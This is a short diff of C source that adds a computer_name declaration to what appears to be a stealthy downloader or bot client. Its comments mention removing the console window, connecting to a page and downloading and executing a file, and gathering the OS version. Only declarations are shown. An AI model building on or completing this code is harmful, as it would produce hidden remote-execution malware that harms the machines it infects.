@@ -13,6 +13,7 @@ void connect_server(SOCKET* s,char* pc,char* version); // connect to page and ge
 void download(char* server_reply); // download and execute file
 void os_version(char* version);
 void freeme();
+void computer_name(TCHAR * computername);
 int main()
 {	
 	// remove console window
